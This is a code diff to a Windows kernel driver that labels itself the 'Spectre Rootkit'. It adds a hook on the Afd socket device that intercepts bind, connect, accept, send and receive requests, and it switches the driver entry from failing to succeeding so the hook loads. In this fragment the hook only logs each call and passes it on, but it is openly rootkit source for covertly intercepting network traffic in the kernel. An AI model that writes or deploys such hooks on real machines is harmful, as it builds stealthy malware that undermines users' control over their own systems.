@@ -18,7 +18,57 @@ DriverEntry (
     _In_ PUNICODE_STRING RegistryPath
     );
 
+//DRIVER_UNLOAD DriverUnload;
+//VOID
+//DriverUnload (
+//	_In_ PDRIVER_OBJECT DriverObject
+//	);
 EXTERN_C_END
+
+NTSTATUS HookIoctl (
+	_In_ DRIVER_DISPATCH OriginalFunction,
+	_In_ struct _DEVICE_OBJECT* DeviceObject,
+	_Inout_ struct _IRP* Irp
+	)
+{
+	NTSTATUS status;
+	PIO_STACK_LOCATION irpStackLocation;
+
+	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);
+	switch (irpStackLocation->Parameters.DeviceIoControl.IoControlCode)
+	{
+	case IOCTL_AFD_BIND:
+		DBGPRINT("HookIoctl: IOCTL_AFD_BIND.");
+		break;
+	case IOCTL_AFD_CONNECT:
+		DBGPRINT("HookIoctl: IOCTL_AFD_CONNECT.");
+		break;
+	case IOCTL_AFD_ACCEPT:
+		DBGPRINT("HookIoctl: IOCTL_AFD_ACCEPT.");
+		break;
+	case IOCTL_AFD_RECV:
+		DBGPRINT("HookIoctl: IOCTL_AFD_RECV.");
+		break;
+	case IOCTL_AFD_SEND:
+		DBGPRINT("HookIoctl: IOCTL_AFD_SEND.");
+		break;
+	}
+
+	status = OriginalFunction(DeviceObject, Irp);
+
+
+
+	return status;
+}
+//
+//VOID
+//DriverUnload (
+//	IN PDRIVER_OBJECT DriverObject
+//	)
+//{
+//	DeviceHook->~FileObjHook();
+//	ExFreePoolWithTag(DeviceHook, 'hFpS');
+//}
 
 /**
 	Initialize the Spectre Rootkit.
@@ -42,7 +92,7 @@ DriverEntry (
 	UNREFERENCED_PARAMETER(DriverObject);
 	UNREFERENCED_PARAMETER(RegistryPath);
 
-	DeviceHook = new (NonPagedPool, 'hFpS') FileObjHook(L"Afd", DirectHook, NULL);
+	DeviceHook = new (NonPagedPool, 'hFpS') FileObjHook(L"Afd", DirectHook, HookIoctl);
 
-	return STATUS_FAILED_DRIVER_ENTRY;
+	return STATUS_SUCCESS;
 }
